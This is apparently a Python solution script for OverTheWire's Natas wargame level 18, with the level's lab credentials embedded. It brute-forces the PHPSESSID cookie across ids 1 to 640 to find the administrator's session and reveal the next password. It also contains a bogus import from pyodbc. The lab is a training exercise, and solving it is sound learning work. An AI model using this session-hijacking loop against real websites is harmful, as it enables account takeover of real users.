#!/usr/bin/env python3
'''
Level 18 → Level 19
Bruteforcing PHPSESSID

github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas18.py

https://www.youtube.com/watch?v=C9yxUTQLbRI&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=16
https://www.youtube.com/watch?v=vz3XVCPBSbA

Username: natas18
URL:      http://natas18.natas.labs.overthewire.org
username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
problem:

write up:
 We need to find the session_id for the administer in the range (1, 641)
 once we find the correct id number the password  will be output
 '''
import string

import requests
#pip uninstall uuid pip install uuid
import re
from string import *

from time import *
from pyodbc import lowercase

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' % username
#url = 'http://%s.natas.labs.overthewire.org/index-source.html' % username
session = requests.Session()
response = session.get(url, auth = (username, password) )

content = response.text

print (content)

for session_id in range(1, 641):
	response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password) )
	content = response.text

	if ( "You are an admin" in content ):
		print ("Got it!", session_id)
		print (content)
		break
	else:
		print ("trying", session_id)
